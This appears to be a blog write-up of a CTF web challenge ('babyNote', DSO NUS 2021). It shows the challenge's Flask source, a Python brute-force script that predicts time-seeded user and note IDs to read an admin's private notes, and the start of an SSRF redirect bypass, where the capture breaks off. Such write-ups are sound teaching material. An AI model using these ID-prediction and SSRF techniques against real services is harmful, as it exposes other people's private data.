@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>DSO NUS 2021 CTF - babyNote (Web) | Enigmatrix</title>
+    <meta name="generator" content="VuePress 1.8.2">
+    <link rel="icon" href="/favicon.png">
+    <meta name="description" content="Too many seeds close together are bad for the plants">
+    
+    <link rel="preload" href="/assets/css/0.styles.d518fe33.css" as="style"><link rel="preload" href="/assets/js/app.c3d8ca62.js" as="script"><link rel="preload" href="/assets/js/6.3722ae10.js" as="script"><link rel="preload" href="/assets/js/3.8eed2eee.js" as="script"><link rel="preload" href="/assets/js/19.9ea997bf.js" as="script"><link rel="prefetch" href="/assets/js/10.4b595a00.js"><link rel="prefetch" href="/assets/js/11.fb3a3275.js"><link rel="prefetch" href="/assets/js/12.e01f3506.js"><link rel="prefetch" href="/assets/js/13.c3ff054c.js"><link rel="prefetch" href="/assets/js/14.cbc77de8.js"><link rel="prefetch" href="/assets/js/15.12185247.js"><link rel="prefetch" href="/assets/js/16.ff9fde79.js"><link rel="prefetch" href="/assets/js/17.c2e9ae64.js"><link rel="prefetch" href="/assets/js/18.b31259ba.js"><link rel="prefetch" href="/assets/js/20.00359bb3.js"><link rel="prefetch" href="/assets/js/21.1cc8c958.js"><link rel="prefetch" href="/assets/js/4.5f78fef9.js"><link rel="prefetch" href="/assets/js/5.98a0c27e.js"><link rel="prefetch" href="/assets/js/7.ff10d07c.js"><link rel="prefetch" href="/assets/js/8.e129988e.js"><link rel="prefetch" href="/assets/js/9.868a262b.js"><link rel="prefetch" href="/assets/js/vuejs-paginate.92caeb0c.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.d518fe33.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div id="root" class="theme-container no-sidebar" data-v-4533fcd8><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Enigmatrix</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
+  Blog
+</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
+  Tags
+</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">
+  Blog
+</a></div><div class="nav-item"><a href="/tags/" class="nav-link">
+  Tags
+</a></div> <!----></nav>  <!----> </aside> <main class="page"><div id="post-header" class="theme-default-content" data-v-4533fcd8><div id="date" data-v-4533fcd8>06 March 2021, 10:30 pm</div> <h1 id="title" data-v-4533fcd8>DSO NUS 2021 CTF - babyNote (Web)</h1> <span id="description" data-v-4533fcd8>Too many seeds close together are bad for the plants</span> <div id="tags" data-v-4533fcd8><a href="/tags/ctf" class="tag" data-v-4533fcd8>ctf</a><a href="/tags/dso-nus-ctf" class="tag" data-v-4533fcd8>dso-nus-ctf</a><a href="/tags/web" class="tag" data-v-4533fcd8>web</a></div></div> <div class="theme-default-content content__default"><p>This was a rather interesting challenge, as initally I did not see any vulnerabilities, and thought to rely on guesswork. But I managed to solve it after trying random things.</p> <p>The challenge presents us with a link and a truncated copy of the source code.</p> <div class="language-py extra-class"><pre class="language-py"><code><span class="token keyword">import</span> string
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> datetime
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> Flask
+<span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps
+<span class="token keyword">from</span> exts <span class="token keyword">import</span> db
+<span class="token keyword">from</span> config <span class="token keyword">import</span> Config
+<span class="token keyword">from</span> models <span class="token keyword">import</span> User<span class="token punctuation">,</span> Note
+<span class="token keyword">from</span> forms <span class="token keyword">import</span> CreateNoteForm
+<span class="token keyword">from</span> utils <span class="token keyword">import</span> <span class="token operator">*</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>Config<span class="token punctuation">)</span>
+db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">login_required</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token decorator annotation punctuation">@wraps</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
+    <span class="token keyword">def</span> <span class="token function">decorated_function</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kws<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;username&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+               <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kws<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> decorated_function
+
+
+<span class="token keyword">def</span> <span class="token function">get_random_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    alphabet <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    results <span class="token operator">=</span> Note<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>prv<span class="token operator">=</span><span class="token string">'False'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>limit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    notes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+        note <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+        note<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>title
+        note<span class="token punctuation">[</span><span class="token string">'note_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>note_id
+        notes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>note<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> notes<span class="token operator">=</span>notes<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@login_required</span>
+<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/create_note'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">create_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        form <span class="token operator">=</span> CreateNoteForm<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&quot;POST&quot;</span><span class="token punctuation">:</span>
+            username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data
+            title <span class="token operator">=</span> form<span class="token punctuation">.</span>title<span class="token punctuation">.</span>data
+            text <span class="token operator">=</span> form<span class="token punctuation">.</span>body<span class="token punctuation">.</span>data
+            prv <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>private<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+            user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span> user<span class="token punctuation">:</span>
+                user_id <span class="token operator">=</span> user<span class="token punctuation">.</span>user_id
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                timestamp <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+                random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
+                user_id <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+                user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> user_id<span class="token operator">=</span>user_id<span class="token punctuation">)</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
+
+            timestamp <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+
+            post_at <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> tz<span class="token operator">=</span>datetime<span class="token punctuation">.</span>timezone<span class="token punctuation">.</span>utc<span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M UTC'</span><span class="token punctuation">)</span>
+
+            random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>user_id <span class="token operator">+</span> post_at<span class="token punctuation">)</span>
+            note_id <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+            note <span class="token operator">=</span> Note<span class="token punctuation">(</span>user_id<span class="token operator">=</span>user_id<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">,</span>
+                        title<span class="token operator">=</span>title<span class="token punctuation">,</span> text<span class="token operator">=</span>text<span class="token punctuation">,</span>
+                        prv<span class="token operator">=</span>prv<span class="token punctuation">,</span> post_at<span class="token operator">=</span>post_at<span class="token punctuation">)</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>note<span class="token punctuation">)</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&quot;create.html&quot;</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/my_notes'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">my_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
+        user_id <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>user_id
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        user_id <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> user_id<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    results <span class="token operator">=</span> Note<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>user_id<span class="token operator">=</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>limit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">all</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    notes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> x <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+        note <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+        note<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>title
+        note<span class="token punctuation">[</span><span class="token string">'note_id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">.</span>note_id
+        notes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>note<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&quot;my_notes.html&quot;</span><span class="token punctuation">,</span> notes<span class="token operator">=</span>notes<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view/&lt;_id&gt;'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    note <span class="token operator">=</span> Note<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>note_id<span class="token operator">=</span>_id<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    user_id <span class="token operator">=</span> note<span class="token punctuation">.</span>user_id
+    username <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>user_id<span class="token operator">=</span>user_id<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>username
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'post_at'</span><span class="token punctuation">:</span> note<span class="token punctuation">.</span>post_at<span class="token punctuation">,</span>
+        <span class="token string">'title'</span><span class="token punctuation">:</span> note<span class="token punctuation">.</span>title<span class="token punctuation">,</span>
+        <span class="token string">'text'</span><span class="token punctuation">:</span> note<span class="token punctuation">.</span>text<span class="token punctuation">,</span>
+        <span class="token string">'username'</span><span class="token punctuation">:</span> username
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>'note<span class="token punctuation">.</span>htm
+</code></pre></div><h2 id="initial-analysis-exploration"><a href="#initial-analysis-exploration" class="header-anchor">#</a> Initial Analysis &amp; Exploration</h2> <p>I managed to find some suspicious segments:</p> <ol><li>Getting notes by <code>user_id</code> (present in source but not in website)</li> <li>Getting <code>/flag</code> (present in website but not in source)</li> <li>We can specifiy the username that the <code>note</code> belongs to during <code>create_note</code>, even if it is not ourselves.</li></ol> <p>Visiting the <code>/flag</code> page, we see that we have to be <code>localhost</code>? Which is a funny check to do.</p> <p>We also note that the <code>note_id</code> is based on a random string generated from the seed of the <code>user_id</code> and the current date and time, but the seconds do not matter.
+Immediately, this is suspicious! This means that two notes will have the same <code>note_id</code> if they are created in the same minute. I tried doing that using the website and managed to replicate this behavior.</p> <p>However, I couldn't proceed more than this, until my next try.</p> <h2 id="trying-random-things"><a href="#trying-random-things" class="header-anchor">#</a> Trying random things</h2> <div class="language-py extra-class"><div class="highlight-lines"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlighted"> </div><br><br><br><br><br><br><br><br><br><br><br><br><div class="highlighted"> </div><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></div><pre class="language-py"><code><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/create_note'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">create_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        form <span class="token operator">=</span> CreateNoteForm<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">&quot;POST&quot;</span><span class="token punctuation">:</span>
+            username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data
+            title <span class="token operator">=</span> form<span class="token punctuation">.</span>title<span class="token punctuation">.</span>data
+            text <span class="token operator">=</span> form<span class="token punctuation">.</span>body<span class="token punctuation">.</span>data
+            prv <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>private<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+            user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span> user<span class="token punctuation">:</span>
+                user_id <span class="token operator">=</span> user<span class="token punctuation">.</span>user_id
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                timestamp <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+                random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
+                user_id <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+                user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> user_id<span class="token operator">=</span>user_id<span class="token punctuation">)</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
+                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
+
+            timestamp <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+
+            post_at <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>fromtimestamp<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> tz<span class="token operator">=</span>datetime<span class="token punctuation">.</span>timezone<span class="token punctuation">.</span>utc<span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M UTC'</span><span class="token punctuation">)</span>
+
+            random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>user_id <span class="token operator">+</span> post_at<span class="token punctuation">)</span>
+            note_id <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+            note <span class="token operator">=</span> Note<span class="token punctuation">(</span>user_id<span class="token operator">=</span>user_id<span class="token punctuation">,</span> note_id<span class="token operator">=</span>note_id<span class="token punctuation">,</span>
+                        title<span class="token operator">=</span>title<span class="token punctuation">,</span> text<span class="token operator">=</span>text<span class="token punctuation">,</span>
+                        prv<span class="token operator">=</span>prv<span class="token punctuation">,</span> post_at<span class="token operator">=</span>post_at<span class="token punctuation">)</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>note<span class="token punctuation">)</span>
+            db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">&quot;create.html&quot;</span><span class="token punctuation">,</span> form<span class="token operator">=</span>form<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+</code></pre></div><p>For the first post of a user, his <code>user_id</code> is based of the current system time, rounded off to 4 decimal places. Then, the <code>note_id</code> is based of his <code>user_id</code> and the current system time, but formatted to only minute-accuracy (<code>post_at</code>). The <code>user_id</code> is not known to us, but all the posts' <code>note_id</code> and <code>post_at</code> is known.</p> <p>Thus, for the initial post of a user, knowing the <code>post_at</code>, we can brute force the exact time of creation in 4 decimal places to generate a <code>user_id</code>. We can verify if it is correct by generating the <code>note_id</code> from this <code>user_id</code> and <code>post_at</code> and matching it with the actual <code>note_id</code>.</p> <div class="language-py extra-class"><pre class="language-py"><code><span class="token keyword">import</span> string
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> time
+<span class="token keyword">from</span> dateutil<span class="token punctuation">.</span>parser <span class="token keyword">import</span> parse
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime
+<span class="token keyword">import</span> pytz
+
+<span class="token comment"># From the app.py</span>
+<span class="token keyword">def</span> <span class="token function">get_random_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    alphabet <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">gen_userid</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>time<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+target_time_str <span class="token operator">=</span> <span class="token string">&quot;2021-01-15 02:31 UTC&quot;</span>
+target_id <span class="token operator">=</span> <span class="token string">&quot;6mxesnyaqdtaj7tipr7enopo89c40msr&quot;</span>
+
+target_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>target_time_str<span class="token punctuation">,</span> <span class="token string">&quot;%Y-%m-%d %H:%M UTC&quot;</span><span class="token punctuation">)</span>
+target_time <span class="token operator">=</span> target_time<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>tzinfo<span class="token operator">=</span>pytz<span class="token punctuation">.</span>UTC<span class="token punctuation">)</span>
+target_time <span class="token operator">=</span> target_time<span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">10000</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    t <span class="token operator">=</span> target_time <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">10000</span><span class="token punctuation">)</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>t<span class="token punctuation">)</span>
+    user_id <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>user_id <span class="token operator">+</span> target_time_str<span class="token punctuation">)</span>
+    nid <span class="token operator">=</span> get_random_id<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> nid <span class="token operator">==</span> target_id<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;SUCCESS&quot;</span><span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ATTEMPT: &quot;</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre></div><p>This is the script to do so. Trying it with the <code>admin</code>'s first post, we can now view his notes, including his private notes, one of which looks very suspicious.</p> <h2 id="random-protection"><a href="#random-protection" class="header-anchor">#</a> Random Protection?</h2> <p>That link is a webpage where can enter a url then get the content of the webpage as text. Trying it with the obvious /flag endpoint, we just get the same respones as if we visited the webpage and viewed the source. Same with using <code>http://localhost/flag</code> instead of the full url. But an external webserver giving redirects works:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
